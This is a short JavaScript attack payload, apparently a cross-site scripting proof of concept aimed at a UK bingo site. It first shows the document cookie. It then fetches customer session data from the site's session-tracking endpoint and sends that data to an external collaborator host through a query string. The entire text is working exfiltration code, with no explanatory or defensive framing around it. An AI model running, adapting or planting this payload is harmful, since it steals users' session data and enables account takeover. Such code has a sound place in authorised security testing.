alert(document.cookie);
// Fetching data from the first URL
fetch("https://uk.bingo.com/session-tracking/rest/secure/customers/sessions")
    .then(response => response.json())
    .then(data => {
        // Extracting the relevant content from the response
        const sessionContent = JSON.stringify(data); // Convert JSON data to string
        const secondUrl = `https://4ch8jbrvprvj4f2n2s6ccj72ptvkji77.oastify.com?data=${encodeURIComponent(sessionContent)}`;
        // Making a request to the second URL with the extracted content
        fetch(secondUrl)
            .then(response => response.text())
            .then(data => {
                // You can do something with the data from the second request here
            });
    });
